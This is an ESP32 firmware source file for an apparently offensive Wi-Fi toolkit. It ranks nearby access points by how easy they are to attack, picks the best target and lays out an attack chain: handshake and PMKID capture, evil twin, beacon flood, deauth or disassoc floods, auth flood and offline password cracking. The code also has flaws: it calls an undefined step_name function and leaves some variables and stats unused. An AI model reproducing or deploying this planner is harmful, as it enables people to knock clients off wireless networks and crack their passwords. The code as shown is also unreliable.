#include "attack_planner.h"
#include "wifi_sniffer.h"
#include "deauth_engine.h"
#include "ai_deauth_predictor.h"
#include "ai_handshake_quality.h"
#include "ai_fingerprint.h"
#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "esp_err.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "attack_planner";

static SemaphoreHandle_t g_lock;
static planner_stats_t g_stats;

static const char *security_str(uint8_t sec)
{
    switch (sec) {
        case 0: return "open";
        case 1: return "WEP";
        case 2: return "WPA";
        case 3: return "WPA2";
        case 4: return "WPA3";
        default: return "unknown";
    }
}

static float score_ap(const ap_info_t *ap)
{
    if (ap == NULL) return 0.0f;

    float score = 0.0f;

    /* Signal strength contributes up to 0.2 */
    if (ap->rssi > -50) score += 0.2f;
    else if (ap->rssi > -60) score += 0.15f;
    else if (ap->rssi > -70) score += 0.1f;
    else if (ap->rssi > -80) score += 0.05f;

    /* Security: older protocols are easier */
    if (!ap->rsn_version && !ap->wpa3_sae) {
        score += 0.25f;
    } else if (ap->rsn_version && !ap->wpa3_sae) {
        score += 0.15f;
    } else if (ap->wpa3_sae) {
        score += 0.05f;
    }

    /* PMF is a penalty */
    if (!ap->pmf_required) {
        score += 0.1f;
    }

    /* Activity: more packets = active target */
    if (ap->pkt_count > 1000) score += 0.15f;
    else if (ap->pkt_count > 100) score += 0.1f;
    else if (ap->pkt_count > 10) score += 0.05f;

    /* HE capable APs tend to be newer and have WPA3 */
    if (ap->he_capable) {
        score -= 0.05f;
    }

    /* Cap at 1.0 */
    if (score > 1.0f) score = 1.0f;
    if (score < 0.0f) score = 0.0f;

    return score;
}

static void build_steps(const ap_info_t *ap, attack_step_t *steps, uint8_t *count)
{
    *count = 0;

    /* Handshake/PMKID capture first */
    if (ap->rsn_version && !ap->wpa3_sae) {
        bool pmkid = false;
        /* Minimal check: if RSN present, assume PMKID possible */
        steps[(*count)++] = ATTACK_STEP_HANDSHAKE_CAPTURE;
        steps[(*count)++] = ATTACK_STEP_PMKID_CAPTURE;
    } else if (!ap->rsn_version && !ap->wpa3_sae) {
        steps[(*count)++] = ATTACK_STEP_EVIL_TWIN;
        steps[(*count)++] = ATTACK_STEP_BEACON_FLOOD;
    }

    /* Deauth/disassoc to kick clients */
    if (!ap->pmf_required) {
        steps[(*count)++] = ATTACK_STEP_DEAUTH;
    } else {
        steps[(*count)++] = ATTACK_STEP_DISASSOC;
    }

    /* Auth flood if nothing else works */
    steps[(*count)++] = ATTACK_STEP_AUTH_FLOOD;

    /* Final step: offline crack */
    steps[(*count)++] = ATTACK_STEP_OFFLINE_CRACK;
}

const char *attack_step_name(attack_step_t step)
{
    switch (step) {
        case ATTACK_STEP_DEAUTH: return "deauth";
        case ATTACK_STEP_DISASSOC: return "disassoc";
        case ATTACK_STEP_AUTH_FLOOD: return "auth_flood";
        case ATTACK_STEP_HANDSHAKE_CAPTURE: return "handshake_capture";
        case ATTACK_STEP_PMKID_CAPTURE: return "pmkid_capture";
        case ATTACK_STEP_OFFLINE_CRACK: return "offline_crack";
        case ATTACK_STEP_EVIL_TWIN: return "evil_twin";
        case ATTACK_STEP_BEACON_FLOOD: return "beacon_flood";
        default: return "none";
    }
}

esp_err_t attack_planner_init(void)
{
    g_lock = xSemaphoreCreateMutex();
    if (g_lock == NULL) {
        return ESP_ERR_NO_MEM;
    }
    memset(&g_stats, 0, sizeof(g_stats));
    ESP_LOGI(TAG, "attack planner init");
    return ESP_OK;
}

esp_err_t attack_planner_build_plan(uint32_t ap_index, attack_plan_t *out)
{
    if (out == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    memset(out, 0, sizeof(*out));

    uint32_t count = wifi_sniffer_get_ap_count();
    if (ap_index >= count) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_ARG;
    }

    ap_info_t ap;
    esp_err_t rc = wifi_sniffer_get_ap(ap_index, &ap);
    if (rc != ESP_OK) {
        xSemaphoreGive(g_lock);
        return rc;
    }

    snprintf(out->bssid, sizeof(out->bssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2],
             ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    snprintf(out->ssid, sizeof(out->ssid), "%s", ap.ssid);
    out->channel = ap.channel;
    out->security = ap.rsn_version ? (ap.wpa3_sae ? 4 : 3) : 0;
    out->pmf_required = ap.pmf_required;
    out->score = score_ap(&ap);

    /* Build warning string */
    if (ap.wpa3_sae) {
        snprintf(out->warning, sizeof(out->warning),
                 "WPA3 target; deauth may not work");
    } else if (ap.pmf_required) {
        snprintf(out->warning, sizeof(out->warning),
                 "PMF required; use disassoc frames");
    } else if (!ap.rsn_version) {
        snprintf(out->warning, sizeof(out->warning),
                 "Legacy/open security; easy target");
    } else {
        snprintf(out->warning, sizeof(out->warning), "WPA2/WPA; capture handshake");
    }

    build_steps(&ap, out->steps, &out->step_count);

    /* Build summary string */
    int n = snprintf(out->summary, sizeof(out->summary),
                     "Target %s [%s] ch %u score %.2f: ",
                     out->bssid, out->ssid, out->channel, out->score);
    for (uint8_t i = 0; i < out->step_count && n + 32 < (int)sizeof(out->summary); i++) {
        n += snprintf(out->summary + n, sizeof(out->summary) - (size_t)n,
                      "%s -> ", step_name(out->steps[i]));
    }
    /* Trim trailing arrow */
    if (n > 4 && strcmp(out->summary + n - 4, " -> ") == 0) {
        out->summary[n - 4] = '\0';
    }

    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t attack_planner_best_target(uint32_t *out_index)
{
    if (out_index == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    uint32_t count = wifi_sniffer_get_ap_count();
    if (count == 0) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_NOT_FOUND;
    }

    float best_score = -1.0f;
    uint32_t best_idx = 0;

    for (uint32_t i = 0; i < count; i++) {
        ap_info_t ap;
        esp_err_t rc = wifi_sniffer_get_ap(i, &ap);
        if (rc != ESP_OK) continue;

        float s = score_ap(&ap);
        if (s > best_score) {
            best_score = s;
            best_idx = i;
        }
    }

    *out_index = best_idx;
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t attack_planner_get_stats(planner_stats_t *out)
{
    if (out == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(100)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }
    memcpy(out, &g_stats, sizeof(g_stats));
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t attack_planner_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;
    planner_stats_t st;
    esp_err_t rc = attack_planner_get_stats(&st);
    if (rc != ESP_OK) return rc;

    int n = snprintf(buf, bufsz,
                     "{\"ap_count\":%u,\"viable\":%u,\"best_idx\":%u,\"best_score\":%.2f}",
                     st.ap_count, st.viable_count, st.best_idx, (double)st.best_score);
    return (n < 0 || (size_t)n >= bufsz) ? ESP_ERR_NO_MEM : ESP_OK;
}

esp_err_t attack_planner_deinit(void)
{
    if (g_lock != NULL) {
        vSemaphoreDelete(g_lock);
        g_lock = NULL;
    }
    memset(&g_stats, 0, sizeof(g_stats));
    return ESP_OK;
}
